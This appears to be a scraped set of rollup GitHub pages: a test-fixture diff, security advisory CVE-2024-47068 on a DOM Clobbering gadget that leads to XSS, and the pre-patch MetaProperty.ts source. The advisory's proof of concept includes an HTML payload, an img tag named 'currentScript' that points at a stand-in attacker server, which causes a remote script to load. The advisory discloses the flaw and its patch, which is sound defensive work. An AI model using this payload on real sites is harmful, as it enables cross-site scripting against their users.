[...unk/\_expected/cjs/entry-main1-5be92ae4.js → ...unk/\_expected/cjs/entry-main1-31317016.js](#diff-fa44d8407c8b3789d5b327f8b01bd9c7df19d6391e8d5b6b1c6f95d169e3a603 "test/chunking-form/samples/render-chunk/_expected/cjs/entry-main1-5be92ae4.js → test/chunking-form/samples/render-chunk/_expected/cjs/entry-main1-31317016.js")

Show comments

[View file](/rollup/rollup/blob/2ef77c00ec2635d42697cff2c0567ccc8db34fb4/test/chunking-form/samples/render-chunk/_expected/cjs/entry-main1-31317016.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,12 +1,12 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | var dep2 = require('./chunk-dep2-8d89c265.js'); |
|  |  | var dep2 = require('./chunk-dep2-e49c5bba.js'); |
|  |  |  |
|  |  | var num = 1; |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  |  |
|  |  | console.log(num + dep2.num); |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  | console.log({ |
|  |  | "exports": [], |
|  |  | "facadeModuleId": "\*\*/main1.js", |
| Expand All | | @@ -20,37 +20,37 @@ console.log({ |
|  |  | "name": "main1", |
|  |  | "type": "chunk", |
|  |  | "dynamicImports": [], |
|  |  | "fileName": "entry-main1-5be92ae4.js", |
|  |  | "fileName": "entry-main1-31317016.js", |
|  |  | "implicitlyLoadedBefore": [], |
|  |  | "importedBindings": { |
|  |  | "chunk-dep2-8d89c265.js": [ |
|  |  | "chunk-dep2-e49c5bba.js": [ |
|  |  | "num" |
|  |  | ] |
|  |  | }, |
|  |  | "imports": [ |
|  |  | "chunk-dep2-8d89c265.js" |
|  |  | "chunk-dep2-e49c5bba.js" |
|  |  | ], |
|  |  | "modules": { |
|  |  | "\*\*/dep1.js": { |
|  |  | "code": "var num = 1;\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.src || document.baseURI).href));", |
|  |  | "code": "var num = 1;\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href));", |
|  |  | "originalLength": 19, |
|  |  | "removedExports": [], |
|  |  | "renderedExports": [ |
|  |  | "num" |
|  |  | ], |
|  |  | "renderedLength": 269 |
|  |  | "renderedLength": 330 |
|  |  | }, |
|  |  | "\*\*/main1.js": { |
|  |  | "code": "console.log(num + dep2.num);\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.src || document.baseURI).href));", |
|  |  | "code": "console.log(num + dep2.num);\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-9f86d081').href : new URL('asset-test-9f86d081', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href));", |
|  |  | "originalLength": 102, |
|  |  | "removedExports": [], |
|  |  | "renderedExports": [], |
|  |  | "renderedLength": 285 |
|  |  | "renderedLength": 346 |
|  |  | } |
|  |  | }, |
|  |  | "referencedFiles": [ |
|  |  | "asset-test-9f86d081" |
|  |  | ] |
|  |  | }); |
|  |  | console.log('all chunks', ["entry-main1-5be92ae4.js","entry-main2-20c5a0f4.js","chunk-dep2-8d89c265.js"]) |
|  |  | console.log('all chunks', ["entry-main1-31317016.js","entry-main2-f63e5752.js","chunk-dep2-e49c5bba.js"]) |
|  |  | console.log('referenced asset in renderChunk', 'asset-test-9f86d081'); |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `2ef77c0`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fcommit%2F2ef77c00ec2635d42697cff2c0567ccc8db34fb4) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_c3edf3ee_20250110_151158.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fsecurity%2Fadvisories%2FGHSA-gcx4-mw62-g8wm)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fsecurity%2Fadvisories%2FGHSA-gcx4-mw62-g8wm)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=rollup%2Frollup)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rollup](/rollup)
/
**[rollup](/rollup/rollup)**
Public

* [Notifications](/login?return_to=%2Frollup%2Frollup) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Frollup%2Frollup)
* [Star
   25.5k](/login?return_to=%2Frollup%2Frollup)

* [Code](/rollup/rollup)
* [Issues
  558](/rollup/rollup/issues)
* [Pull requests
  25](/rollup/rollup/pulls)
* [Discussions](/rollup/rollup/discussions)
* [Actions](/rollup/rollup/actions)
* [Projects
  0](/rollup/rollup/projects)
* [Wiki](/rollup/rollup/wiki)
* [Security](/rollup/rollup/security)
* [Insights](/rollup/rollup/pulse)

Additional navigation options

* [Code](/rollup/rollup)
* [Issues](/rollup/rollup/issues)
* [Pull requests](/rollup/rollup/pulls)
* [Discussions](/rollup/rollup/discussions)
* [Actions](/rollup/rollup/actions)
* [Projects](/rollup/rollup/projects)
* [Wiki](/rollup/rollup/wiki)
* [Security](/rollup/rollup/security)
* [Insights](/rollup/rollup/pulse)

# DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS

Moderate

[lukastaegert](/lukastaegert)
published
GHSA-gcx4-mw62-g8wm
Sep 21, 2024

## Package

npm

rollup
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

>=0.59.0 <2.79.2 || >=3.0.0 <3.29.5 || >=4.0.0 <4.22.4

## Patched versions

2.79.2, 3.29.5, 4.22.4

## Description

### Summary

We discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.

It's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.

### Details

#### Backgrounds

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] <https://scnps.co/papers/sp23_domclob.pdf>

[2] <https://research.securitum.com/xss-in-amp4email-dom-clobbering/>

#### Gadget found in `rollup`

We have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.

[rollup/src/ast/nodes/MetaProperty.ts](https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162)

Lines 157 to 162
in
[b86ffd7](/rollup/rollup/commit/b86ffd776cfa906573d36c3f019316d02445d9ef)

|  | const getRelativeUrlFromDocument = (relativePath: string, umd = false) => |
| --- | --- |
|  | getResolveUrl( |
|  | `'${escapeId(relativePath)}', ${ |
|  | umd ? `typeof document === 'undefined' ? location.href : ` : '' |
|  | }document.currentScript && document.currentScript.src || document.baseURI` |
|  | ); |

[rollup/src/ast/nodes/MetaProperty.ts](https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185)

Lines 180 to 185
in
[b86ffd7](/rollup/rollup/commit/b86ffd776cfa906573d36c3f019316d02445d9ef)

|  | const getUrlFromDocument = (chunkId: string, umd = false) => |
| --- | --- |
|  | `${ |
|  | umd ? `typeof document === 'undefined' ? location.href : ` : '' |
|  | }(${DOCUMENT\_CURRENT\_SCRIPT} && ${DOCUMENT\_CURRENT\_SCRIPT}.src || new URL('${escapeId( |
|  | chunkId |
|  | )}', document.baseURI).href)`; |

However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.

### PoC

Considering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.

```
var s = document.createElement('script')
s.src = import.meta.url + 'extra.js'
document.head.append(s)

```

The output `bundle.js` is shown in the following code snippet.

```
'use strict';

var _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;
var s = document.createElement('script');
s.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';
document.head.append(s);

```

Adding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
<!DOCTYPE html>
<html>
<head>
  <title>rollup Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name="currentScript" src="https://attacker.controlled.server/"></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script type="module" crossorigin src="bundle.js"></script>
<body>
</body>
</html>

```
### Impact

This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.

### Patch

Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.

```
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =>
	getResolveUrl(
		`'${escapeId(relativePath)}', ${
			umd ? `typeof document === 'undefined' ? location.href : ` : ''
		}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`
	);

```

```
const getUrlFromDocument = (chunkId: string, umd = false) =>
	`${
		umd ? `typeof document === 'undefined' ? location.href : ` : ''
	}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(
		chunkId
	)}', document.baseURI).href)`;

```

### Severity

Moderate

6.4

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
High

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
Low

Integrity
Low

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H

### CVE ID

CVE-2024-47068

### Weaknesses

[CWE-79](/advisories?query=cwe%3A79)

### Credits

* [![@jackfromeast](https://avatars.githubusercontent.com/u/51242003?s=40&v=4)](/jackfromeast)
  [jackfromeast](/jackfromeast)
  Analyst
* [![@ishmeals](https://avatars.githubusercontent.com/u/44672716?s=40&v=4)](/ishmeals)
  [ishmeals](/ishmeals)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_5323bc9b_20250110_151154.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fblob%2Fb86ffd776cfa906573d36c3f019316d02445d9ef%2Fsrc%2Fast%2Fnodes%2FMetaProperty.ts)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fblob%2Fb86ffd776cfa906573d36c3f019316d02445d9ef%2Fsrc%2Fast%2Fnodes%2FMetaProperty.ts)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=rollup%2Frollup)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rollup](/rollup)
/
**[rollup](/rollup/rollup)**
Public

* [Notifications](/login?return_to=%2Frollup%2Frollup) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Frollup%2Frollup)
* [Star
   25.5k](/login?return_to=%2Frollup%2Frollup)

* [Code](/rollup/rollup)
* [Issues
  558](/rollup/rollup/issues)
* [Pull requests
  25](/rollup/rollup/pulls)
* [Discussions](/rollup/rollup/discussions)
* [Actions](/rollup/rollup/actions)
* [Projects
  0](/rollup/rollup/projects)
* [Wiki](/rollup/rollup/wiki)
* [Security](/rollup/rollup/security)
* [Insights](/rollup/rollup/pulse)

Additional navigation options

* [Code](/rollup/rollup)
* [Issues](/rollup/rollup/issues)
* [Pull requests](/rollup/rollup/pulls)
* [Discussions](/rollup/rollup/discussions)
* [Actions](/rollup/rollup/actions)
* [Projects](/rollup/rollup/projects)
* [Wiki](/rollup/rollup/wiki)
* [Security](/rollup/rollup/security)
* [Insights](/rollup/rollup/pulse)

## Files

 b86ffd7
## Breadcrumbs

1. [rollup](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef)
2. /[src](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src)
3. /[ast](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast)
4. /[nodes](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes)
/
# MetaProperty.ts

 Blame  Blame
## Latest commit

## History

[History](/rollup/rollup/commits/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts)225 lines (201 loc) · 7.54 KB b86ffd7
## Breadcrumbs

1. [rollup](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef)
2. /[src](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src)
3. /[ast](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast)
4. /[nodes](/rollup/rollup/tree/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes)
/
# MetaProperty.ts

Top
## File metadata and controls

* Code
* Blame

225 lines (201 loc) · 7.54 KB[Raw](https://github.com/rollup/rollup/raw/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225import type MagicString from 'magic-string';import type { InternalModuleFormat } from '../../rollup/types';import type { PluginDriver } from '../../utils/PluginDriver';import { escapeId } from '../../utils/escapeId';import type { GenerateCodeSnippets } from '../../utils/generateCodeSnippets';import { DOCUMENT\_CURRENT\_SCRIPT } from '../../utils/interopHelpers';import { dirname, normalize, relative } from '../../utils/path';import type { RenderOptions } from '../../utils/renderHelpers';import type { NodeInteraction } from '../NodeInteractions';import { INTERACTION\_ACCESSED } from '../NodeInteractions';import type ChildScope from '../scopes/ChildScope';import type { ObjectPath } from '../utils/PathTracker';import type Identifier from './Identifier';import MemberExpression from './MemberExpression';import type \* as NodeType from './NodeType';import { NodeBase } from './shared/Node';
const FILE\_PREFIX = 'ROLLUP\_FILE\_URL\_';const IMPORT = 'import';
export default class MetaProperty extends NodeBase { declare meta: Identifier; declare property: Identifier; declare type: NodeType.tMetaProperty;
 private metaProperty: string | null = null; private preliminaryChunkId: string | null = null; private referenceId: string | null = null;
 getReferencedFileName(outputPluginDriver: PluginDriver): string | null { const { meta: { name }, metaProperty } = this; if (name === IMPORT && metaProperty?.startsWith(FILE\_PREFIX)) { return outputPluginDriver.getFileName(metaProperty.slice(FILE\_PREFIX.length)); } return null; }
 hasEffects(): boolean { return false; }
 hasEffectsOnInteractionAtPath(path: ObjectPath, { type }: NodeInteraction): boolean { return path.length > 1 || type !== INTERACTION\_ACCESSED; }
 include(): void { if (!this.included) { this.included = true; if (this.meta.name === IMPORT) { this.scope.context.addImportMeta(this); const parent = this.parent; const metaProperty = (this.metaProperty = parent instanceof MemberExpression && typeof parent.propertyKey === 'string' ? parent.propertyKey : null); if (metaProperty?.startsWith(FILE\_PREFIX)) { this.referenceId = metaProperty.slice(FILE\_PREFIX.length); } } } }
 render(code: MagicString, renderOptions: RenderOptions): void { const { format, pluginDriver, snippets } = renderOptions; const { scope: { context: { module } }, meta: { name }, metaProperty, parent, preliminaryChunkId, referenceId, start, end } = this; const { id: moduleId } = module;
 if (name !== IMPORT) return; const chunkId = preliminaryChunkId!;
 if (referenceId) { const fileName = pluginDriver.getFileName(referenceId); const relativePath = normalize(relative(dirname(chunkId), fileName)); const replacement = pluginDriver.hookFirstSync('resolveFileUrl', [ { chunkId, fileName, format, moduleId, referenceId, relativePath } ]) || relativeUrlMechanisms[format](relativePath);
 code.overwrite( (parent as MemberExpression).start, (parent as MemberExpression).end, replacement, { contentOnly: true } ); return; }
 let replacement = pluginDriver.hookFirstSync('resolveImportMeta', [ metaProperty, { chunkId, format, moduleId } ]); if (!replacement) { replacement = importMetaMechanisms[format]?.(metaProperty, { chunkId, snippets }); renderOptions.accessedDocumentCurrentScript ||= formatsMaybeAccessDocumentCurrentScript.includes(format) && replacement !== 'undefined'; } if (typeof replacement === 'string') { if (parent instanceof MemberExpression) { code.overwrite(parent.start, parent.end, replacement, { contentOnly: true }); } else { code.overwrite(start, end, replacement, { contentOnly: true }); } } }
 setResolution( format: InternalModuleFormat, accessedGlobalsByScope: Map<ChildScope, Set<string>>, preliminaryChunkId: string ): void { this.preliminaryChunkId = preliminaryChunkId; const accessedGlobals = ( this.metaProperty?.startsWith(FILE\_PREFIX) ? accessedFileUrlGlobals : accessedMetaUrlGlobals )[format]; if (accessedGlobals.length > 0) { this.scope.addAccessedGlobals(accessedGlobals, accessedGlobalsByScope); } }}
export const formatsMaybeAccessDocumentCurrentScript = ['cjs', 'iife', 'umd'];
const accessedMetaUrlGlobals = { amd: ['document', 'module', 'URL'], cjs: ['document', 'require', 'URL', DOCUMENT\_CURRENT\_SCRIPT], es: [], iife: ['document', 'URL', DOCUMENT\_CURRENT\_SCRIPT], system: ['module'], umd: ['document', 'require', 'URL', DOCUMENT\_CURRENT\_SCRIPT]};
const accessedFileUrlGlobals = { amd: ['document', 'require', 'URL'], cjs: ['document', 'require', 'URL'], es: [], iife: ['document', 'URL'], system: ['module', 'URL'], umd: ['document', 'require', 'URL']};
const getResolveUrl = (path: string, URL = 'URL') => `new ${URL}(${path}).href`;
const getRelativeUrlFromDocument = (relativePath: string, umd = false) => getResolveUrl( `'${escapeId(relativePath)}', ${ umd ? `typeof document === 'undefined' ? location.href : ` : '' }document.currentScript && document.currentScript.src || document.baseURI` );
const getGenericImportMetaMechanism = (getUrl: (chunkId: string) => string) => (property: string | null, { chunkId }: { chunkId: string }) => { const urlMechanism = getUrl(chunkId); return property === null ? `({ url: ${urlMechanism} })` : property === 'url' ? urlMechanism : 'undefined'; };
const getFileUrlFromFullPath = (path: string) => `require('u' + 'rl').pathToFileURL(${path}).href`;
const getFileUrlFromRelativePath = (path: string) => getFileUrlFromFullPath(`\_\_dirname + '/${escapeId(path)}'`);
const getUrlFromDocument = (chunkId: string, umd = false) => `${ umd ? `typeof document === 'undefined' ? location.href : ` : '' }(${DOCUMENT\_CURRENT\_SCRIPT} && ${DOCUMENT\_CURRENT\_SCRIPT}.src || new URL('${escapeId( chunkId )}', document.baseURI).href)`;
const relativeUrlMechanisms: Record<InternalModuleFormat, (relativePath: string) => string> = { amd: relativePath => { if (relativePath[0] !== '.') relativePath = './' + relativePath; return getResolveUrl(`require.toUrl('${escapeId(relativePath)}'), document.baseURI`); }, cjs: relativePath => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath( relativePath )} : ${getRelativeUrlFromDocument(relativePath)})`, es: relativePath => getResolveUrl(`'${escapeId(relativePath)}', import.meta.url`), iife: relativePath => getRelativeUrlFromDocument(relativePath), system: relativePath => getResolveUrl(`'${escapeId(relativePath)}', module.meta.url`), umd: relativePath => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath( relativePath )} : ${getRelativeUrlFromDocument(relativePath, true)})`};
